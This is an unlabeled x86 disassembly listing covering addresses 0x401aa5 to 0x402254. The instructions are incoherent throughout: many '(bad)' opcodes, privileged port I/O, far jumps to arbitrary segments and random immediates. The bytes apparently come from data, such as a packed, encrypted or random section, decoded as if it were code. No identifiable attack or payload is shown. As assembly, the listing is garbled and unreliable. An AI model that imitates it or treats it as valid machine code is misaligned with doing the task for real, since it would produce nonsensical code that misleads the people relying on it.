  401aa5:	out    0xfc,eax
  401aa7:	sub    bl,BYTE PTR ds:[eax+esi*8]
  401aab:	pop    eax
  401aac:	xchg   esi,eax
  401aad:	jb     0x401a86
  401aaf:	mov    ebx,0x1c7000e9
  401ab4:	js     0x401b0c
  401ab6:	or     eax,0x7e78ce8b
  401abb:	mov    esi,ecx
  401abd:	push   edi
  401abe:	xor    DWORD PTR [esi-0x67b0d597],0x52
  401ac5:	dec    edi
  401ac6:	xchg   ecx,eax
  401ac7:	push   edx
  401ac8:	xchg   DWORD PTR [esi+0x26e14578],edi
  401ace:	fist   WORD PTR [ebp-0x10b11b51]
  401ad4:	cmp    al,0x3b
  401ad6:	mov    ah,BYTE PTR [esi]
  401ad8:	lods   eax,DWORD PTR ds:[esi]
  401ad9:	mov    edx,0x96374825
  401ade:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401adf:	jl     0x401b57
  401ae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ae2:	adc    al,0xd6
  401ae4:	lock cdq 
  401ae6:	push   es
  401ae7:	mov    cl,0xf4
  401ae9:	imul   esp,DWORD PTR [ecx-0x6f],0xffffffad
  401aed:	dec    esp
  401aee:	inc    eax
  401aef:	aam    0x48
  401af1:	gs retf 
  401af3:	adc    dh,al
  401af5:	out    dx,eax
  401af6:	sub    BYTE PTR ds:0xdca6203d,bl
  401afc:	ret    0xacd0
  401aff:	fwait
  401b00:	sar    DWORD PTR [edi-0x71],cl
  401b03:	cs xor ecx,0xffffff9d
  401b07:	mov    esp,0x3a0cd463
  401b0c:	pop    ss
  401b0d:	(bad)  
  401b0e:	scas   eax,DWORD PTR es:[edi]
  401b0f:	jg     0x401abf
  401b11:	aaa    
  401b12:	push   ecx
  401b13:	imul   ebx,DWORD PTR [ebx-0x7],0x256af4c1
  401b1a:	popa   
  401b1b:	dec    ebp
  401b1c:	dec    esp
  401b1d:	test   BYTE PTR [edi+eax*2+0x29],0xd1
  401b22:	jmp    0x2cbb1273
  401b27:	mov    cl,BYTE PTR [ebp+ebp*1+0x56]
  401b2b:	fidivr DWORD PTR [ecx+0x46]
  401b2e:	repnz sub eax,0xbe7bef48
  401b34:	cld    
  401b35:	and    dl,BYTE PTR [edi+0x72]
  401b38:	aad    0x86
  401b3a:	fld    DWORD PTR [ebx]
  401b3c:	dec    eax
  401b3d:	inc    edi
  401b3e:	adc    al,0x7
  401b40:	pushf  
  401b41:	adc    BYTE PTR [edx+esi*8],dh
  401b44:	aaa    
  401b45:	(bad)
  401b48:	add    eax,0x430e0c1a
  401b4d:	mov    DWORD PTR [ebp-0x38a7bb6b],0x8e8c897c
  401b57:	pop    eax
  401b58:	lds    ebp,FWORD PTR [edx-0x3d70d59a]
  401b5e:	mov    ebp,0x2b022476
  401b63:	mov    bl,0xfa
  401b65:	mov    cl,0xb9
  401b67:	pop    es
  401b68:	out    0xe9,al
  401b6a:	mov    BYTE PTR [ecx-0x2f],cl
  401b6d:	push   0x4c
  401b6f:	stos   BYTE PTR es:[edi],al
  401b70:	dec    eax
  401b71:	sbb    al,0xcc
  401b73:	sbb    DWORD PTR [ecx],esp
  401b75:	mov    eax,ds:0xa854af39
  401b7a:	lods   eax,DWORD PTR ds:[esi]
  401b7b:	xchg   esp,eax
  401b7c:	sbb    BYTE PTR [edi+0x57],al
  401b7f:	ficomp DWORD PTR [ebx-0x21]
  401b82:	jns    0x401ba9
  401b84:	ins    DWORD PTR es:[edi],dx
  401b85:	and    BYTE PTR [ebp+edx*2-0x6f5b07a7],ch
  401b8c:	xchg   ebp,eax
  401b8d:	mov    ebx,0x59a0e091
  401b93:	adc    dl,BYTE PTR [ebx-0x589aadf3]
  401b99:	push   esp
  401b9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b9b:	lods   eax,DWORD PTR ds:[esi]
  401b9c:	mov    eax,0xfcfc4fc5
  401ba1:	xor    eax,0x2d022dbd
  401ba6:	test   al,0xdc
  401ba8:	push   eax
  401ba9:	jecxz  0x401c10
  401bab:	test   ebp,esp
  401bad:	jbe    0x401b69
  401baf:	int    0xe
  401bb1:	repnz push eax
  401bb3:	lahf   
  401bb4:	inc    esp
  401bb5:	xchg   DWORD PTR [ebx+0x163543ff],ebx
  401bbb:	adc    BYTE PTR [edi+0x48ef2102],0x65
  401bc2:	in     eax,dx
  401bc3:	aam    0x8f
  401bc5:	daa    
  401bc6:	ror    BYTE PTR ds:0xe35eebb3,0x7
  401bcd:	imul   edi,DWORD PTR [ebp-0xd],0x78d751a1
  401bd4:	pop    esp
  401bd5:	retf   
  401bd6:	dec    ecx
  401bd7:	xor    al,0xd1
  401bd9:	jne    0x401bac
  401bdb:	in     al,dx
  401bdc:	push   ss
  401bdd:	test   DWORD PTR [ebx],edi
  401bdf:	xchg   DWORD PTR [eax],esp
  401be1:	and    DWORD PTR [edi-0x2385dcb7],esp
  401be7:	or     al,0x72
  401be9:	xlat   BYTE PTR ds:[ebx]
  401bea:	jno    0x401c01
  401bec:	into   
  401bed:	mov    bl,0x76
  401bef:	push   ss
  401bf0:	sahf   
  401bf1:	jb     0x401c72
  401bf3:	sbb    ebx,0xffffff80
  401bf6:	xor    al,0x7c
  401bf8:	loope  0x401c61
  401bfa:	aad    0x88
  401bfc:	jo     0x401bf7
  401bfe:	push   ebx
  401bff:	adc    al,0xd
  401c01:	pusha  
  401c02:	(bad)  
  401c03:	push   ecx
  401c04:	pop    ebx
  401c05:	ror    DWORD PTR [edi-0x17576b22],cl
  401c0b:	test   DWORD PTR [edi+edx*1],0xf363d7ae
  401c12:	add    cl,BYTE PTR [edx-0x46]
  401c15:	add    bl,BYTE PTR [ebp+0x2fe97ab2]
  401c1b:	sar    BYTE PTR [esi],0x13
  401c1e:	rcr    DWORD PTR [edx+0x20],1
  401c21:	cmp    eax,0xc63fbd2f
  401c26:	stc    
  401c27:	fcom   st(0)
  401c29:	pop    ss
  401c2a:	inc    edi
  401c2b:	push   edx
  401c2c:	pop    ds
  401c2d:	mov    ds:0x2dc565d0,al
  401c32:	stos   BYTE PTR es:[edi],al
  401c33:	cmp    al,0x78
  401c35:	sbb    ebx,ebp
  401c37:	sbb    DWORD PTR [ecx+0x64],esp
  401c3a:	test   esi,edi
  401c3c:	(bad)  
  401c3d:	mov    esi,0x4895cd3a
  401c42:	fstp   TBYTE PTR [eax]
  401c44:	aas    
  401c45:	sub    DWORD PTR [edi-0x6a],0xc35752d3
  401c4c:	xchg   ebx,eax
  401c4d:	sub    BYTE PTR [esi],bl
  401c4f:	jne    0x401ca0
  401c51:	sub    cl,cl
  401c53:	test   DWORD PTR [eax],esi
  401c55:	les    esi,FWORD PTR [esp]
  401c58:	adc    edi,DWORD PTR [eax+0x299211f2]
  401c5e:	pop    ecx
  401c5f:	imul   ecx,DWORD PTR [edi-0x49],0x98f09e53
  401c66:	xor    eax,DWORD PTR ds:0x3dae1983
  401c6c:	mov    gs,WORD PTR [edx]
  401c6e:	pop    edi
  401c6f:	jmp    0xa6ed6ea2
  401c74:	push   esp
  401c75:	arpl   bp,dx
  401c77:	sub    DWORD PTR [edi],0x913b1c49
  401c7d:	test   eax,0x416e9643
  401c82:	les    ebx,FWORD PTR gs:[esi+0x7]
  401c86:	xor    esp,DWORD PTR [edi+0x65]
  401c89:	outs   dx,DWORD PTR ds:[esi]
  401c8a:	push   0x9239fef
  401c8f:	inc    ecx
  401c90:	sbb    eax,0x9bae19cb
  401c95:	jmp    0x2ebb56e4
  401c9a:	btr    DWORD PTR [eax+eax*8+0x44],ecx
  401c9f:	xchg   ebx,eax
  401ca0:	clc    
  401ca1:	jne    0x401ce3
  401ca3:	std    
  401ca4:	clc    
  401ca5:	dec    edx
  401ca6:	pop    ds
  401ca7:	xchg   esi,eax
  401ca8:	lods   eax,DWORD PTR ds:[esi]
  401ca9:	xlat   BYTE PTR ds:[ebx]
  401caa:	jle    0x401cec
  401cac:	dec    eax
  401cad:	out    0x44,al
  401caf:	push   ebx
  401cb0:	push   edx
  401cb1:	inc    edi
  401cb2:	jmp    0x918af2a1
  401cb7:	icebp  
  401cb8:	leave  
  401cb9:	aas    
  401cba:	pop    eax
  401cbb:	les    esi,FWORD PTR [ecx-0x53]
  401cbe:	fmul   QWORD PTR [eax]
  401cc0:	ret    
  401cc1:	test   eax,edx
  401cc3:	mov    dh,0xe1
  401cc5:	pop    ecx
  401cc6:	sbb    al,0x6c
  401cc8:	fld    TBYTE PTR [esi-0x4f7db193]
  401cce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ccf:	inc    esp
  401cd0:	push   ebx
  401cd1:	and    ch,0x61
  401cd4:	add    DWORD PTR [ecx],esp
  401cd6:	sti    
  401cd7:	dec    edi
  401cd8:	call   0xef04:0xb8c0f7df
  401cdf:	xor    eax,0x9066fd7d
  401ce4:	dec    esp
  401ce5:	adc    al,0x75
  401ce7:	xchg   edi,eax
  401ce8:	repz iret 
  401cea:	adc    cl,BYTE PTR [ebp+0x71]
  401ced:	iret   
  401cee:	mov    ah,BYTE PTR [edi-0x74bd440]
  401cf4:	in     eax,0xb4
  401cf6:	pop    eax
  401cf7:	push   eax
  401cf8:	add    ah,dl
  401cfa:	sahf   
  401cfb:	arpl   WORD PTR ss:[ebx-0x21],sp
  401cff:	fsub   QWORD PTR ds:0xabc5312
  401d05:	stos   DWORD PTR es:[edi],eax
  401d06:	mov    bh,0x89
  401d08:	mov    bh,0x66
  401d0a:	adc    ch,ch
  401d0c:	(bad)  
  401d0d:	dec    ebp
  401d0e:	xor    eax,0x749521cc
  401d13:	outs   dx,BYTE PTR ds:[esi]
  401d14:	pushf  
  401d15:	inc    eax
  401d16:	xchg   BYTE PTR [edx+0x1c],ch
  401d19:	xchg   esp,eax
  401d1a:	mov    ?,ebx
  401d1c:	add    BYTE PTR [ebp-0x17cd1789],ah
  401d22:	xchg   ebp,eax
  401d23:	scas   eax,DWORD PTR es:[edi]
  401d24:	dec    edx
  401d25:	fsub   DWORD PTR [ecx]
  401d27:	fsubr  st,st(3)
  401d29:	pop    ebx
  401d2a:	xor    BYTE PTR [ebx],0x5e
  401d2d:	test   eax,0xe176ed4c
  401d32:	adc    eax,eax
  401d34:	xor    edx,ebp
  401d36:	out    0x65,al
  401d38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d39:	fbstp  TBYTE PTR [esi-0x61]
  401d3c:	mov    cl,0xa3
  401d3e:	push   edx
  401d3f:	pop    ds
  401d40:	hlt    
  401d41:	sub    BYTE PTR [ebp+0x58d6cae5],al
  401d47:	ds add al,0x83
  401d4a:	cli    
  401d4b:	push   ebx
  401d4c:	aaa    
  401d4d:	and    bh,BYTE PTR [ebp+edi*1-0x6fccd828]
  401d54:	dec    edi
  401d55:	call   0x2b02:0x73b90b6
  401d5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d5d:	inc    eax
  401d5e:	mov    ds:0xef6381ae,eax
  401d63:	in     al,0xb2
  401d65:	lea    esi,[edi]
  401d67:	mov    edx,0x14e5178a
  401d6c:	adc    al,0x79
  401d6e:	xchg   edx,eax
  401d6f:	xchg   ecx,eax
  401d70:	(bad)  
  401d71:	dec    esi
  401d72:	or     al,0xd5
  401d74:	jns    0x401d70
  401d76:	sub    eax,0x93883c8a
  401d7b:	sub    DWORD PTR [edx+0x2c],0xffffffc0
  401d7f:	lods   eax,DWORD PTR ds:[esi]
  401d80:	int3   
  401d81:	mov    edx,0x98930b5c
  401d86:	and    edi,DWORD PTR [edi-0xc52f3ab]
  401d8c:	mov    esp,0xe820aa71
  401d91:	sbb    DWORD PTR [edx],0xc4d1cd58
  401d97:	cmp    eax,0xbf26d391
  401d9c:	add    eax,0xd0d118f2
  401da1:	push   ebp
  401da2:	popf   
  401da3:	xchg   edx,eax
  401da4:	pop    ds
  401da5:	ret    
  401da6:	pop    eax
  401da7:	or     ch,BYTE PTR [eax+0xdfd7c7f]
  401dad:	inc    eax
  401dae:	xchg   ebx,eax
  401daf:	pusha  
  401db0:	test   al,0x8
  401db2:	mov    ds:0xc0cf6ab7,eax
  401db7:	xchg   esp,eax
  401db8:	mov    ss,ebx
  401dba:	inc    ebx
  401dbb:	and    eax,0x9f7a4107
  401dc0:	pop    ecx
  401dc1:	or     BYTE PTR [esi],0xba
  401dc4:	mov    eax,ds:0x10939e8e
  401dc9:	sti    
  401dca:	outs   dx,DWORD PTR ds:[esi]
  401dcb:	jmp    0x401e15
  401dcd:	int3   
  401dce:	xchg   BYTE PTR [ecx+0x69],ch
  401dd1:	cwde   
  401dd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dd3:	mov    ds:0x696935c5,al
  401dd8:	js     0x401e08
  401dda:	fild   DWORD PTR [ecx+0x7bdcff08]
  401de0:	inc    ebx
  401de1:	mov    ebp,0x4ba1e39b
  401de6:	xchg   esi,eax
  401de7:	mov    BYTE PTR [eax-0x4aaba3d5],cl
  401ded:	cmp    bl,BYTE PTR [esi+0x10ad6da9]
  401df3:	mov    BYTE PTR [eax],ah
  401df5:	loop   0x401e4a
  401df7:	sahf   
  401df8:	mov    al,ds:0xecf03f50
  401dfd:	jp     0x401e6e
  401dff:	fld    TBYTE PTR [ebp+eax*4+0x3c244cc8]
  401e06:	arpl   WORD PTR [ebp+0x47a449b1],dx
  401e0c:	fadd   QWORD PTR [esi+0x55ce73dd]
  401e12:	jp     0x401e2a
  401e14:	dec    ebx
  401e15:	add    DWORD PTR [edx-0x7c],0xffffffeb
  401e19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e1a:	lahf   
  401e1b:	in     al,dx
  401e1c:	jge    0x401e72
  401e1e:	adc    eax,DWORD PTR [eax+0x65]
  401e21:	std    
  401e22:	pop    ds
  401e23:	sub    BYTE PTR [esi-0x175d9eb9],dh
  401e29:	sub    BYTE PTR [esi],al
  401e2b:	or     eax,0xb3e3dd95
  401e30:	jnp    0x401eb0
  401e32:	add    DWORD PTR [edx],eax
  401e34:	repz push esi
  401e36:	jg     0x401e8c
  401e38:	in     eax,dx
  401e39:	call   DWORD PTR [ebx]
  401e3b:	mov    ecx,0x6cdf3ff7
  401e41:	jle    0x401e0c
  401e43:	push   es
  401e44:	mov    edi,0xe02a8ebf
  401e49:	xor    al,BYTE PTR [ecx+ebp*8]
  401e4c:	push   ss
  401e4d:	mov    ah,0xfc
  401e4f:	jmp    0x8e99:0x7669a8c0
  401e56:	and    ecx,DWORD PTR [edi]
  401e58:	mov    DWORD PTR es:[ecx-0x4],ebp
  401e5c:	jb     0x401e3f
  401e5e:	lds    ebx,FWORD PTR [eax+0x63c3e5fe]
  401e64:	or     eax,0x29344db2
  401e69:	ss push ebx
  401e6b:	sbb    BYTE PTR [ebp+0x22c3afa5],al
  401e71:	jno    0x401ee3
  401e73:	fld    DWORD PTR [eax]
  401e75:	mov    al,ds:0x12982f82
  401e7a:	pusha  
  401e7b:	mov    ah,0xc5
  401e7d:	pop    eax
  401e7e:	dec    esp
  401e7f:	push   ds
  401e80:	shl    eax,cl
  401e82:	sub    al,0xed
  401e84:	jae    0x401ebd
  401e86:	sub    DWORD PTR ds:0xdda52c10,0xffffffa3
  401e8d:	psubusb mm3,mm6
  401e90:	mov    ch,0xe2
  401e92:	xchg   ebp,eax
  401e93:	jge    0x401f13
  401e95:	imul   esi,edx,0x952ef5b4
  401e9b:	dec    edx
  401e9c:	dec    eax
  401e9d:	rol    DWORD PTR [esi-0x2],1
  401ea0:	mov    ebp,0xb89b2d75
  401ea5:	or     BYTE PTR [ecx],bh
  401ea7:	or     bl,ah
  401ea9:	sub    al,BYTE PTR [ecx-0x8]
  401eac:	test   BYTE PTR [ecx+edx*8-0x56],0x58
  401eb1:	mov    al,0x36
  401eb3:	add    eax,0xcafe3e19
  401eb8:	adc    dl,dh
  401eba:	and    edx,DWORD PTR [ebx]
  401ebc:	add    ecx,DWORD PTR [ecx+edx*4+0x3450322]
  401ec3:	sbb    eax,0xe4fdbe7a
  401ec8:	xor    ah,dl
  401eca:	lahf   
  401ecb:	xchg   ebx,eax
  401ecc:	fadd   QWORD PTR [ecx-0x5c5e8562]
  401ed2:	sar    WORD PTR [esi],1
  401ed5:	dec    ebx
  401ed6:	inc    ebp
  401ed7:	outs   dx,DWORD PTR ds:[esi]
  401ed8:	push   es
  401ed9:	or     BYTE PTR [eax],0xff
  401edc:	pushf  
  401edd:	dec    edi
  401ede:	hlt    
  401edf:	jg     0x401ee4
  401ee1:	mov    ds:0x7697a5ea,eax
  401ee6:	add    al,BYTE PTR [edx+0x48]
  401ee9:	cmp    esi,DWORD PTR [edi-0x5ef28e27]
  401eef:	(bad)  
  401ef0:	mov    ebp,0x8f1949d4
  401ef5:	outs   dx,BYTE PTR ss:[esi]
  401ef7:	shl    edi,1
  401ef9:	mov    dl,0x57
  401efb:	cmp    DWORD PTR [ebp+eax*2+0x2e02e951],0xfad23045
  401f06:	sti    
  401f07:	xchg   esp,eax
  401f08:	fstp   TBYTE PTR [ecx-0x5a371e67]
  401f0e:	fwait
  401f0f:	clc    
  401f10:	sahf   
  401f11:	mov    cl,0xdf
  401f13:	adc    esp,edi
  401f15:	pop    edi
  401f16:	xor    al,0x68
  401f18:	jbe    0x401ed1
  401f1a:	or     BYTE PTR [ebx+0x39],cl
  401f1d:	test   eax,0x269025e
  401f22:	ss imul esi,esp,0xffffff94
  401f26:	sbb    DWORD PTR [ebp+0x61652387],ebx
  401f2c:	cmc    
  401f2d:	jns    0x401f7c
  401f2f:	adc    eax,0x528ba470
  401f34:	scas   eax,DWORD PTR es:[edi]
  401f35:	lods   al,BYTE PTR ds:[esi]
  401f36:	sub    al,BYTE PTR [edi+0xc]
  401f39:	add    bp,si
  401f3c:	add    DWORD PTR [ebp-0x2],0x29
  401f40:	adc    edx,esi
  401f42:	sub    BYTE PTR [edx-0x4b45463d],bh
  401f48:	imul   ebp,DWORD PTR [eax],0x9a0b1226
  401f4e:	rcl    esi,1
  401f50:	xchg   edi,eax
  401f51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f52:	repz ret 
  401f54:	arpl   WORD PTR [ebx+eiz*4-0x5a],cx
  401f58:	mov    dl,0x7c
  401f5a:	xchg   esi,eax
  401f5b:	dec    esi
  401f5c:	adc    BYTE PTR [edi+0x39],0x2f
  401f60:	aam    0x2b
  401f62:	lock add dh,BYTE PTR [ebx-0x6eef9076]
  401f69:	les    ecx,FWORD PTR [edi]
  401f6b:	inc    ebp
  401f6c:	add    cl,BYTE PTR ds:0x3be3e035
  401f72:	cmp    dl,ch
  401f74:	mov    WORD PTR [esi],cs
  401f76:	iret   
  401f77:	pop    es
  401f78:	je     0x401f7e
  401f7a:	in     al,dx
  401f7b:	loope  0x401fe3
  401f7d:	retf   0x6159
  401f80:	jb     0x401fe5
  401f82:	jmp    0x3409a713
  401f87:	bound  eax,QWORD PTR [eax+0x60a0e3ac]
  401f8d:	jecxz  0x401f97
  401f8f:	mov    DWORD PTR [ecx+ebx*4-0x6b43739e],esi
  401f96:	jns    0x401f77
  401f98:	and    al,bl
  401f9a:	aam    0x29
  401f9c:	shl    BYTE PTR [ecx-0x23],1
  401f9f:	dec    ecx
  401fa0:	repz out 0x5,al
  401fa3:	adc    DWORD PTR [edi],ebx
  401fa5:	test   DWORD PTR [ebx+eiz*1+0x3adfa688],edi
  401fac:	daa    
  401fad:	int    0x22
  401faf:	in     eax,dx
  401fb0:	ja     0x401ff3
  401fb2:	dec    ecx
  401fb3:	outs   dx,BYTE PTR ds:[esi]
  401fb4:	mov    ah,0xa6
  401fb6:	push   edi
  401fb7:	fistp  QWORD PTR [eiz*8+0x69752696]
  401fbe:	or     ebx,DWORD PTR [esi+ebx*2-0x7751dda7]
  401fc5:	cmovno esp,edx
  401fc8:	int    0xe9
  401fca:	(bad)
  401fce:	sbb    DWORD PTR [eax-0x28],esp
  401fd1:	jecxz  0x401fb0
  401fd3:	jnp    0x402023
  401fd5:	mov    bh,0xb9
  401fd7:	mov    ds:0x5ce80121,eax
  401fdc:	hlt    
  401fdd:	sbb    al,0x3
  401fdf:	sub    BYTE PTR [ebx],bh
  401fe1:	jns    0x401fe3
  401fe3:	jns    0x401fc5
  401fe5:	add    esi,ebp
  401fe7:	sbb    BYTE PTR [esi],0xae
  401fea:	sbb    ecx,DWORD PTR [ecx+0x5a]
  401fed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fee:	push   esi
  401fef:	xlat   BYTE PTR ds:[ebx]
  401ff0:	adc    eax,0xb3f0eefd
  401ff6:	sbb    ecx,ebp
  401ff8:	jne    0x401ff7
  401ffa:	out    0xe4,al
  401ffc:	sub    bl,cl
  401ffe:	mov    cl,0x9a
  402000:	cwde   
  402001:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402002:	sbb    eax,DWORD PTR [eax+0x989f596]
  402008:	gs inc esp
  40200a:	push   edx
  40200b:	add    eax,0x95cc55c6
  402010:	jo     0x401fec
  402012:	xor    eax,0x7af5b430
  402017:	push   di
  402019:	mov    eax,0xf0b21535
  40201e:	mov    esi,0xcc0e8f46
  402023:	fidiv  DWORD PTR [ebp-0x37fa0a50]
  402029:	xchg   ebx,eax
  40202a:	xchg   ebp,eax
  40202b:	stos   BYTE PTR es:[edi],al
  40202c:	xor    eax,0x3daa4ec0
  402031:	ds xor cl,dl
  402034:	xor    eax,0x5b7fd93e
  402039:	dec    esi
  40203a:	lods   al,BYTE PTR ds:[esi]
  40203b:	iret   
  40203c:	add    eax,0x4f47b009
  402041:	mov    DWORD PTR [ebx-0x2f],esi
  402044:	pop    ecx
  402045:	jno    0x4020c4
  402047:	lods   eax,DWORD PTR ds:[esi]
  402048:	ds fcmovb st,st(6)
  40204b:	or     dh,BYTE PTR [ecx+0x31]
  40204e:	(bad)
  402051:	ss (bad) 
  402054:	retf   0x1a3c
  402057:	retf   0x6eed
  40205a:	sub    al,0x0
  40205c:	es xchg ecx,eax
  40205e:	inc    ecx
  40205f:	or     al,0xcb
  402061:	push   edi
  402062:	jns    0x40205c
  402064:	jmp    eax
  402066:	inc    ebp
  402067:	(bad)
  40206a:	push   esi
  40206b:	mov    esp,0xc09ebf4c
  402070:	cmp    al,0x57
  402072:	xor    ch,BYTE PTR [esi]
  402074:	xchg   ebx,eax
  402075:	jp     0x4020bf
  402077:	aas    
  402078:	iret   
  402079:	fs cmc 
  40207b:	lahf   
  40207c:	movups XMMWORD PTR [esi],xmm2
  40207f:	xchg   edx,eax
  402080:	xor    bl,BYTE PTR [esi]
  402082:	xchg   ecx,eax
  402083:	cld    
  402084:	mov    cl,0x3
  402086:	int    0xd
  402088:	dec    esp
  402089:	or     DWORD PTR [ebx+eiz*8],ebx
  40208c:	lds    ebp,FWORD PTR [edx]
  40208e:	and    bh,BYTE PTR [ecx]
  402090:	jnp    0x4020a5
  402092:	mov    ebp,DWORD PTR [edi+0x67]
  402095:	jo     0x40208b
  402097:	cmp    esp,DWORD PTR [ecx-0x45281a69]
  40209d:	fidiv  WORD PTR [edx+esi*1+0x2118ae86]
  4020a4:	mov    esp,0xa6a6189e
  4020a9:	sti    
  4020aa:	call   0xcf62:0x546d062b
  4020b1:	je     0x4020d1
  4020b3:	adc    bh,BYTE PTR [ebx+0x2a49a2c9]
  4020b9:	fisttp WORD PTR [ebx-0xa]
  4020bc:	inc    ebp
  4020bd:	retf   
  4020be:	pop    ebp
  4020bf:	push   ds
  4020c0:	cmp    ebx,DWORD PTR [ebx]
  4020c2:	pop    ebp
  4020c3:	xchg   DWORD PTR [edi],edx
  4020c5:	rcl    BYTE PTR [eax+ebx*4+0x79571fe6],cl
  4020cc:	(bad)  
  4020cd:	js     0x402133
  4020cf:	pop    ebx
  4020d0:	aad    0x10
  4020d2:	xchg   esi,eax
  4020d3:	stc    
  4020d4:	xor    DWORD PTR [esi],eax
  4020d6:	outs   dx,BYTE PTR fs:[esi]
  4020d8:	pop    ds
  4020d9:	retf   0x9fbc
  4020dc:	out    dx,al
  4020dd:	loop   0x402143
  4020df:	ret    0x3f61
  4020e2:	xchg   esi,eax
  4020e3:	out    0x13,al
  4020e5:	enter  0x7512,0xe3
  4020e9:	dec    eax
  4020ea:	dec    edi
  4020eb:	mov    al,ds:0xba5c8efe
  4020f0:	dec    esp
  4020f1:	xor    BYTE PTR [esi-0x42],dh
  4020f4:	scas   al,BYTE PTR es:[edi]
  4020f5:	inc    esi
  4020f6:	or     al,0xc7
  4020f8:	adc    eax,0x198a9a87
  4020fd:	mov    ch,0x88
  4020ff:	iret   
  402100:	retfw  0x2fb0
  402104:	dec    ecx
  402105:	inc    edi
  402106:	sbb    al,0x9
  402108:	sbb    eax,0x4de97e5a
  40210d:	jmp    0x402117
  40210f:	dec    edx
  402110:	loope  0x4020eb
  402112:	scas   al,BYTE PTR es:[edi]
  402113:	(bad)  
  402114:	ins    BYTE PTR es:[edi],dx
  402115:	int3   
  402116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402117:	aam    0x74
  402119:	fdivr  QWORD PTR [esi-0x28]
  40211c:	pop    ecx
  40211d:	mov    ah,0xc5
  40211f:	xchg   DWORD PTR [ebp-0x1938e6ae],esi
  402125:	mov    dl,0xba
  402127:	xchg   esi,eax
  402128:	xlat   BYTE PTR ds:[ebx]
  402129:	add    esp,0xffffffaa
  40212c:	pop    ebx
  40212d:	pushf  
  40212e:	xchg   edi,eax
  40212f:	and    al,0x30
  402131:	mov    esi,0xd0a7b408
  402136:	adc    eax,0x65126f01
  40213b:	mov    ds,WORD PTR [eax-0xe]
  40213e:	cdq    
  40213f:	xchg   ecx,eax
  402140:	shl    DWORD PTR [eax-0x40817abe],cl
  402146:	pop    eax
  402147:	lea    ebx,[eax]
  402149:	cmp    BYTE PTR [eax+0x46],cl
  40214c:	push   ds
  40214d:	add    al,0x6c
  40214f:	popf   
  402150:	loopne 0x40217e
  402152:	shr    BYTE PTR [esi],1
  402154:	sti    
  402155:	test   eax,0x5902f46
  40215a:	aad    0x45
  40215c:	cdq    
  40215d:	lods   eax,DWORD PTR ds:[esi]
  40215e:	stos   BYTE PTR es:[edi],al
  40215f:	enter  0xc9b4,0xe0
  402163:	jno    0x4021d5
  402165:	fcomp  st(6)
  402167:	and    BYTE PTR [ebp+0x278a561],0x17
  40216e:	xchg   ecx,eax
  40216f:	enter  0xbcc4,0x1
  402173:	lock hlt 
  402175:	sbb    cl,BYTE PTR [ebx]
  402177:	clc    
  402178:	lock jmp 0xc469:0x6bca356a
  402180:	gs adc eax,0x72456366
  402186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402187:	gs xchg ebp,eax
  402189:	dec    esp
  40218a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40218b:	inc    ebx
  40218c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40218d:	inc    ecx
  40218e:	xor    DWORD PTR [edx+0x56532a7b],edi
  402194:	scas   al,BYTE PTR es:[edi]
  402195:	lods   eax,DWORD PTR ds:[esi]
  402196:	inc    eax
  402197:	loopne 0x4021e6
  402199:	inc    esi
  40219a:	add    eax,0xd7c1bce0
  40219f:	lds    ecx,FWORD PTR [ebx-0x31a4ee76]
  4021a5:	xchg   BYTE PTR [ebp+0x67],bl
  4021a8:	push   0xfffffff8
  4021aa:	test   DWORD PTR [eax],esp
  4021ac:	xchg   esi,eax
  4021ad:	add    eax,0x9e408b3c
  4021b2:	inc    edi
  4021b3:	xor    bh,BYTE PTR [edx+0x4faa28b9]
  4021b9:	in     eax,0x71
  4021bb:	xchg   DWORD PTR [edx+0x1c],ecx
  4021be:	dec    esp
  4021bf:	fist   WORD PTR [ebp+0x3f8a521b]
  4021c5:	sbb    BYTE PTR [ebx-0x2d7ad324],0xde
  4021cc:	add    cl,ah
  4021ce:	jg     0x402166
  4021d0:	pop    edi
  4021d1:	imul   esi,DWORD PTR ds:[ecx+0x6508dcbf],0xb31bd3e8
  4021dc:	lahf   
  4021dd:	sti    
  4021de:	pop    ds
  4021df:	xchg   ecx,eax
  4021e0:	and    bl,cl
  4021e2:	test   al,0xe3
  4021e4:	pop    esi
  4021e5:	cmp    ah,BYTE PTR [ecx+0x53]
  4021e8:	mov    ds:0xb88fd306,al
  4021ed:	mov    esp,0x79f39be3
  4021f2:	mov    eax,0xb469a731
  4021f7:	or     ebp,DWORD PTR [edi-0x258c8728]
  4021fd:	fwait
  4021fe:	gs dec eax
  402200:	push   0x40
  402202:	sub    ebp,DWORD PTR [ebx]
  402204:	cmp    dh,BYTE PTR [ecx+esi*1-0x12]
  402208:	inc    esp
  402209:	xor    DWORD PTR [edi+0x4d18e199],ebp
  40220f:	push   ebp
  402210:	rcr    bh,0x9f
  402213:	lahf   
  402214:	inc    esi
  402215:	loopne 0x40226c
  402217:	daa    
  402218:	sbb    dl,BYTE PTR [edi]
  40221a:	test   al,0xa0
  40221c:	mov    ch,0x85
  40221e:	std    
  40221f:	out    0x8c,al
  402221:	pop    ss
  402222:	add    al,0xde
  402224:	pop    ebp
  402225:	or     edi,DWORD PTR [esi]
  402227:	push   edi
  402228:	push   0x8fe12ad5
  40222d:	cmp    BYTE PTR [edx],ch
  40222f:	imul   edx,edi,0xffffffdb
  402232:	xor    ch,BYTE PTR [edi]
  402234:	cwde   
  402235:	jl     0x4021fc
  402237:	addr16 inc esi
  402239:	ss jp  0x40225e
  40223c:	(bad)  
  40223d:	push   eax
  40223e:	xor    bl,BYTE PTR [edi+0x74]
  402241:	push   eax
  402242:	lock div bh
  402245:	mov    al,0xe1
  402247:	or     eax,0x81db33e2
  40224c:	and    DWORD PTR [ecx+ebp*2+0x47],0x1772e744
  402254:	(bad)  
